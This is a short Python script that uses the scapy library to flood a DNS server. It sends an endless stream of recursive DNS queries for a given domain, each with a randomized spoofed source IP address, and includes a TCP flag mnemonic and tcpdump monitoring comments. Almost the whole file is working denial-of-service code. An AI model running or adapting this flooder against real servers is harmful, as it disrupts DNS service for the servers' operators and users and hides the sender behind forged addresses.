#!/usr/bin/env python3
#example: elcomercio.pe 192.168.1.3 192.168.1.2

"""
Unskilled =  URG  =  (Not Displayed in Flag Field, Displayed elsewhere) 
Attackers =  ACK  =  (Not Displayed in Flag Field, Displayed elsewhere)
Pester    =  PSH  =  [P] (Push Data)
Real      =  RST  =  [R] (Reset Connection)
Security  =  SYN  =  [S] (Start Connection)
Folks     =  FIN  =  [F] (Finish Connection)
          SYN-ACK =  [S.] (SynAcK Packet)
                     [.] (No Flag Set)
https://gist.github.com/tuxfight3r/9ac030cb0d707bb446c7
"""

import sys
from scapy.all import *

qname = sys.argv[1]
dns_server = sys.argv[2]
ip_spoof= sys.argv[3]

print("qname:", qname)
print("dns_server:", dns_server)
print("ip_spoof:", ip_spoof)

#pkg = IP(dst=dns_server)/\
pkg = IP(src=RandIP("192.168.1.2/24"),dst=dns_server)/\
    UDP(dport=53)/\
    DNS(rd=1,qd=DNSQR(qname=qname))

#print(pkg.show2(dns_req))

send(pkg, loop=1, verbose=1, iface="en0")
#answer = sr1(pkg, verbose=0)
#print(answer[DNS].summary())

# sudo tcpdump -i enp2s0 "src 192.168.1.2 and port 53"
# sudo nmon

